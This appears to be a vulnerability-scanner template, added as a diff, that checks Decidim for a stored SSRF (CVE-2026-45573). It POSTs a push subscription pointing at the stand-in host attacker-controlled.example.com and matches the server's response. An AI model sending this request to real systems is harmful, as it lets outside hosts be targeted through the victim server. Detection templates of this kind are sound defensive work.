@@ -1,0 +1,50 @@
+[info]
+author = "AVE"
+description = "检测 Decidim 推送订阅端点是否接受攻击者控制的 HTTPS URL 作为推送端点，验证存储型 SSRF 漏洞。攻击者可通过注册恶意 endpoint 使服务器向任意 HTTPS 目标发送 POST 请求。"
+id = "POC-AVE-2026-0284"
+name = "CVE-2026-45573 Decidim Push Subscription SSRF PoC"
+severity = "medium"
+tags = [
+    "cve-2026-45573",
+    "ssrf",
+    "decidim",
+    "push-notification",
+]
+vuln_id = [
+    "CVE-2026-45573",
+    "AVE-2026-0284",
+    "GHSA-2g9c-vf8h-prxx",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/notifications_subscriptions"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"subscription":{"endpoint":"https://attacker-controlled.example.com/push","keys":{"p256dh":"BOrS1J4GJ3Q8wzJ5Y6p7Qk8L9m0N1P2R3S4T5U6V7W8X9Y0Z1A2B3C4D5E6F7G8H9I0J","auth":"aGVsbG8gd29ybGQgdGhpcyBpcyBhIHRlc3Q"}}}'
+type = "json"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    200,
+    201,
+]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "subscription",
+    "endpoint",
+]
